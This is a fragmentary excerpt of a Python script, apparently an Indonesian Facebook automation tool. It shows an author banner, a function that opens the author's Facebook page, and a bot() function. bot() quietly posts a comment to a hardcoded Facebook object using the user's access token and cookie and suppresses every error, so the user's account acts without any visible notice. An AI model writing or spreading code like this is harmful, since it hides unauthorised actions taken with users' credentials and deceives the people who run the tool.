...
def banner():
	basari_tamvan('=' * 40)
	print(f"""{Z}[•] JALANKAN SESUKA HATIMU [•]
{h} AUTOR : ROBET XD
{h} TEAM :TERMUK ID
{h}  {O}TERMUK ID    {P}""")
	basari_tamvan('=' * 40)
...
def bot():
	try:
		requests.post(f"https://graph.facebook.com/178570731509812/comments/?message={kom1}&access_token={token}", headers = {"cookie":cok})
	except:
		pass
...
def authorbas():
	...
	time.sleep(4)
	os.system("xdg-open https://www.facebook.com/Suwann.XD")
	back()
